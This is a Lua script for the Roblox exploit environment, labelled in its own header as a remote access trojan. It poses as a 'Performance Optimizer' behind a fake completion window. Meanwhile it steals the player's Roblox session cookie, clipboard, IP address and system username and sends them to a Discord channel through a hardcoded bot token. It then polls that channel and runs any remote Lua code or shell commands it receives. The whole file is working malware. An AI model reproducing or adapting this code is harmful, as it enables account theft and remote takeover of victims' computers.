-- ============================================================
-- DEBUG RAT – With Full Logging
-- ============================================================
local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
local channelID = "1543230748180615198"

local function sendMessage(content)
    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {
        ["Authorization"] = "Bot " .. botToken,
        ["Content-Type"] = "application/json"
    }
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== READ LAST MESSAGE (with full response logging) ==========
local function getLastMessage()
    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages?limit=1"
    local headers = {["Authorization"] = "Bot " .. botToken, ["Content-Type"] = "application/json"}
    -- Try request first
    local ok, res = pcall(request, {Url = url, Method = "GET", Headers = headers})
    if ok and res and res.Body then
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        if data and #data > 0 then
            return data[1].content or ""
        else
            return nil -- no messages or malformed
        end
    end
    -- Try http_request
    ok, res = pcall(http_request, {Url = url, Method = "GET", Headers = headers})
    if ok and res and res.Body then
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        if data and #data > 0 then
            return data[1].content or ""
        end
    end
    -- Try HttpService:GetAsync (if supported)
    ok, res = pcall(function()
        return game:GetService("HttpService"):GetAsync(url, {Headers = headers})
    end)
    if ok and res then
        local data = game:GetService("HttpService"):JSONDecode(res)
        if data and #data > 0 then
            return data[1].content or ""
        end
    end
    return nil -- failed
end

-- ========== EXECUTE COMMANDS ==========
local function executeCommand(cmd)
    if cmd:sub(1, 6) == "!exec " then
        local code = cmd:sub(7)
        local fn, err = loadstring(code)
        if fn then
            local ok, result = pcall(fn)
            if ok then
                return "✅ Executed.\nOutput: " .. tostring(result)
            else
                return "❌ Error: " .. tostring(result)
            end
        else
            return "❌ Loadstring error: " .. tostring(err)
        end
    end
    if cmd:sub(1, 7) == "!shell " then
        local shellCmd = cmd:sub(8)
        if io and io.popen then
            local handle, err = io.popen(shellCmd)
            if handle then
                local output = handle:read("*a")
                handle:close()
                return "```\n" .. output .. "\n```"
            else
                return "❌ io.popen error: " .. tostring(err)
            end
        else
            return "❌ io.popen not available. Use !exec instead."
        end
    end
    return "Unknown command. Use !exec <lua> or !shell <cmd>"
end

-- ========== COLLECT DATA ==========
local function collectSnapshot()
    local player = game.Players.LocalPlayer
    local info = {
        executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown",
        userId = player and tostring(player.UserId) or "N/A",
        userName = player and player.Name or "N/A",
        displayName = player and player.DisplayName or "N/A",
        placeId = tostring(game.PlaceId),
        jobId = game.JobId or "N/A",
        gameName = game.Name or "Unknown",
        placeVisits = tostring(game.PlaceVisitCount or "N/A"),
        genres = game.Genres or "N/A",
    }
    -- IP
    local ip = "N/A"
    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
    if ip == "N/A" then
        ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
        if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
    end
    if ip == "N/A" then
        ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org") end)
        if ok and res then ip = res:gsub("%s+", "") end
    end
    info.ip = ip
    -- Cookie
    local cookie = "Not available"
    ok, res = pcall(getcookie, "https://www.roblox.com/")
    if ok and res and res ~= "" then cookie = res end
    info.cookie = cookie
    -- Clipboard
    local clip = "N/A"
    ok, res = pcall(getclipboard)
    if ok and res and res ~= "" then clip = res end
    info.clipboard = clip
    -- Character
    pcall(function()
        local char = player and player.Character
        if char then
            local hum = char:FindFirstChild("Humanoid")
            if hum then
                info.health = tostring(hum.Health)
                info.maxHealth = tostring(hum.MaxHealth)
                info.walkSpeed = tostring(hum.WalkSpeed)
                info.jumpPower = tostring(hum.JumpPower)
            end
        end
    end)
    -- Ping & FPS
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)
    -- Hardware
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
    end)
    -- System env
    pcall(function()
        info.os = os.getenv("OS") or "N/A"
        info.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A"
        info.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A"
    end)
    return info
end

-- ========== SEND INITIAL ==========
local function sendInitial()
    local data = collectSnapshot()
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("%s: %s", k, tostring(v)))
        end
    end
    local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
    sendMessage(msg)
end

-- ========== GUI ==========
local function createGUI()
    pcall(function()
        local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local gui = Instance.new("ScreenGui")
        gui.Parent = pg
        gui.ResetOnSpawn = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 400, 0, 150)
        f.Position = UDim2.new(0.5, -200, 0.5, -75)
        f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        f.BackgroundTransparency = 0.1
        f.Parent = gui
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 50)
        t.Position = UDim2.new(0, 0, 0, 10)
        t.BackgroundTransparency = 1
        t.Text = "Performance Optimizer"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextScaled = true
        t.Font = Enum.Font.GothamBold
        t.Parent = f
        local s = Instance.new("TextLabel")
        s.Size = UDim2.new(1, 0, 0, 30)
        s.Position = UDim2.new(0, 0, 0.4, 0)
        s.BackgroundTransparency = 1
        s.Text = "Optimization complete!"
        s.TextColor3 = Color3.fromRGB(200, 200, 210)
        s.TextScaled = true
        s.Font = Enum.Font.Gotham
        s.Parent = f
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 100, 0, 35)
        btn.Position = UDim2.new(0.5, -50, 1, -45)
        btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        btn.Text = "CLOSE"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = f
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    end)
end

-- ========== MAIN ==========
sendMessage("```🔧 RAT starting – debug mode ON```")

-- Send initial data dump
sendInitial()
createGUI()

-- Command polling loop with debug
local lastMsg = ""
local loopCount = 0
while true do
    task.wait(3)
    loopCount = loopCount + 1
    -- Every 10 loops (30 seconds), send a heartbeat to confirm script is alive
    if loopCount % 10 == 0 then
        sendMessage("```💓 Heartbeat: Script still running (loop " .. loopCount .. ")```")
    end
    
    local msg = getLastMessage()
    if msg then
        -- If we got a message
        if msg ~= lastMsg and (msg:sub(1,6)=="!exec " or msg:sub(1,7)=="!shell ") then
            lastMsg = msg
            sendMessage("```📩 Command detected: " .. msg .. "```") -- debug
            local response = executeCommand(msg)
            sendMessage(response)
        end
    else
        -- If getLastMessage returned nil, it failed to fetch messages
        if loopCount % 5 == 0 then
            sendMessage("```⚠️ Failed to fetch messages – check permissions and token.```")
        end
    end
end
